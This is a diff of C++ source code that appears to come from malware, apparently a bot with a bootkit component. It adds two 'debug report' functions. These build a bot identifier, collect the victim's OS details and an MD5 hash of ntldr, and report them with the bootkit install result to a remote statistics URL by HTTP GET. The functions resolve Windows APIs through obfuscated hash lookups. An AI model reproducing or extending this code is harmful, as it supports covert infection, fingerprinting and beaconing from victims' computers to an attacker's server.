@@ -746,6 +746,86 @@ bool GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
 	return true;
 }
 
+void DebugReportStep1()
+{
+	CHAR NtldrMd5Buffer[100];
+	PCHAR OsInfo = NULL;
+	PCHAR NtldrMd5 = NULL;
+
+	DebugReportSettings* settings = DebugReportGetSettings();
+	DBGRPTDBG("GetDriverUrl",
+		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+		settings->Enabled, settings->StatPrefix, settings->StatUrl
+		);
+
+	if (!settings->Enabled) return;
+	string BotUid = GenerateUidAsString(settings->StatPrefix);
+
+	OsInfo = GetOSInfo();
+	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));
+
+	PStrings Fields = Strings::Create();
+	AddURLParam(Fields, "cmd", "beforerbt");
+	AddURLParam(Fields, "uid", BotUid.t_str());
+	AddURLParam(Fields, "os", OsInfo);
+
+	if (NtldrMd5 != NULL)
+	{
+		AddURLParam(Fields, "cs01", NtldrMd5);
+	}
+
+	PCHAR Params = Strings::GetText(Fields, "&");
+	PCHAR URL = STR::New(2, settings->StatUrl, Params);
+
+	PP_DPRINTF("DebugReportStep1: sending url='%s'", URL);
+
+	HTTP::Get(URL, NULL, NULL);
+
+	STR::Free(URL);
+	STR::Free(Params);
+	Strings::Free(Fields);
+	MemFree(OsInfo);
+	DebugReportFreeSettings(settings);
+}
+
+void DebugReportStep2(DWORD BkInstallResult)
+{
+	CHAR value[50];
+
+	DebugReportSettings* settings = DebugReportGetSettings();
+	DBGRPTDBG("GetDriverUrl",
+		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+		settings->Enabled, settings->StatPrefix, settings->StatUrl
+		);
+
+	if (!settings->Enabled) return;
+	string BotUid = GenerateUidAsString(settings->StatPrefix);
+
+	typedef int ( WINAPI *fwsprintfA)( PCHAR lpOut, PCHAR lpFmt, ... );
+	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
+
+	m_memset(value, 0, sizeof(value));
+
+	_pwsprintfA(value, "%u", BkInstallResult);
+
+	PStrings Fields = Strings::Create();
+	AddURLParam(Fields, "cmd", "bkinstall");
+	AddURLParam(Fields, "uid", BotUid.t_str());
+	AddURLParam(Fields, "val", value);
+
+	PCHAR Params = Strings::GetText(Fields, "&");
+	PCHAR URL = STR::New(2, settings->StatUrl, Params);
+	
+	PP_DPRINTF("DebugReportStep2: sending url='%s'", URL);
+
+	HTTP::Get(URL, NULL, NULL);
+
+	STR::Free(URL);
+	STR::Free(Params);
+	Strings::Free(Fields);
+	DebugReportFreeSettings(settings);
+}
+
 bool DebugReportSaveUrlForBootkitDriver()
 {
 	WCHAR  key_path[] = L"SOFTWARE\\Classes\\CLSID\\{8CB0A413-0585-4886-B110-004B3BCAA9A8}";
